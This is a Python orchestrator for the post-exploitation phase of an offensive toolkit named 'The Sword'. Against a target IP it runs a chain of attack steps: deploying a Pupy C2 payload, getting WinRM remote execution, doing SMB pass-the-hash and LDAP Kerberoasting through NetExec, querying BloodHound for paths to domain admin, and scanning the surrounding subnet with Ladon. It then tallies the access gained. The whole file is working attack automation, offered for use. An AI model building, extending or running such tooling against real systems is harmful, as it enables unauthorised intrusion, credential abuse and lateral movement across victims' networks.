#!/usr/bin/env python3
"""Phase 3 — Post-Exploitation orchestrator for The Sword offensive pipeline."""

import sys, os, asyncio
sys.path.insert(0, "/raphael")

from orchestrator.postex.pupy_c2 import PupyC2
from orchestrator.postex.winrm_exploit import WinRMExploit
from orchestrator.postex.netexec_wrapper import NetExecWrapper
from orchestrator.postex.bloodhound_integration import BloodHoundIntegration
from orchestrator.postex.ladon_scanner import LadonScanner


class Phase3PostEx:
    def __init__(self, target_ip: str, domain: str = None, username: str = None,
                 password: str = None, hash: str = None, network: str = None):
        self.target_ip = target_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.hash = hash
        self.network = network or ".".join(target_ip.split(".")[:3] + ["0/24"])
        self._pup = PupyC2()
        self._wrm = WinRMExploit()
        self._nxc = NetExecWrapper()
        self._bh = BloodHoundIntegration()
        self._ldn = LadonScanner()

    async def run(self) -> dict:
        results = {
            "target_ip": self.target_ip,
            "domain": self.domain,
            "pupy": {}, "winrm": {}, "netexec": {},
            "bloodhound": {}, "ladon": {},
            "sessions": [], "access_level": "none", "summary": {},
        }
        try:
            results["pupy"] = await asyncio.to_thread(self._pupy)
        except Exception as e:
            results["pupy"] = {"error": str(e)}
        try:
            results["winrm"] = await asyncio.to_thread(self._winrm)
        except Exception as e:
            results["winrm"] = {"error": str(e)}
        try:
            results["netexec"] = await asyncio.to_thread(self._netexec)
        except Exception as e:
            results["netexec"] = {"error": str(e)}
        try:
            results["bloodhound"] = await asyncio.to_thread(self._bloodhound, "find_da")
        except Exception as e:
            results["bloodhound"] = {"error": str(e)}
        try:
            results["ladon"] = await asyncio.to_thread(self._ladon, self.network)
        except Exception as e:
            results["ladon"] = {"error": str(e)}

        results["sessions"] = self._sessions(results)
        results["access_level"] = self._calc_access(results)
        results["summary"] = self._summarize(results)
        return results

    def _pupy(self) -> dict:
        r = self._pup.deploy_payload(self.target_ip)
        if self.username:
            r["exec_result"] = self._pup.execute(self.target_ip, "whoami")
        return r

    def _winrm(self) -> dict:
        if not self.username:
            return {"connected": False, "error": "no credentials provided"}
        r = self._wrm.connect(self.target_ip, self.username,
                               password=self.password, hash=self.hash)
        if r.get("connected"):
            r["exec_result"] = self._wrm.execute(
                self.target_ip, "whoami", username=self.username,
                password=self.password, hash=self.hash)
        return r

    def _netexec(self) -> dict:
        r = {}
        if self.hash:
            r["smb_pass_the_hash"] = self._nxc.smb_pth(
                self.target_ip, self.username or "Administrator", self.hash)
        if self.username:
            r["smb_enum"] = self._nxc.smb_enum(
                self.target_ip, username=self.username,
                password=self.password, hash=self.hash)
        if self.username and self.password:
            r["ldap_kerberoast"] = self._nxc.ldap_kerberoast(
                self.target_ip, self.username, self.password)
        return r

    def _bloodhound(self, query_name: str) -> dict:
        return self._bh.run_query(query_name)

    def _ladon(self, network: str) -> dict:
        return self._ldn.scan(network)

    def _sessions(self, results: dict) -> list:
        sessions = []
        if results.get("pupy", {}).get("payload"):
            sessions.append({"type": "pupy_c2", "target": self.target_ip})
        if results.get("winrm", {}).get("connected"):
            sessions.append({"type": "winrm", "target": self.target_ip,
                             "user": self.username})
        return sessions

    def _calc_access(self, results: dict) -> str:
        if results.get("winrm", {}).get("connected"):
            return "user" if not results.get("bloodhound", {}).get("results") else "domain_admin"
        if results.get("pupy", {}).get("payload"):
            return "user"
        if results.get("netexec", {}).get("ldap_kerberoast", {}).get("success"):
            return "enumeration"
        return "none"

    def _summarize(self, results: dict) -> dict:
        gained = []
        if results.get("pupy", {}).get("payload"):
            gained.append("pupy_c2_deployed")
        if results.get("winrm", {}).get("connected"):
            gained.append("winrm_shell")
        if results.get("netexec"):
            gained.append("lateral_movement")
        if results.get("bloodhound", {}).get("count", 0) > 0:
            gained.append("domain_info")
        if results.get("ladon", {}).get("host_count", 0) > 0:
            gained.append("network_pivot")
        return {
            "access_gained": gained,
            "status": "phase_3_complete",
            "target": self.target_ip,
        }
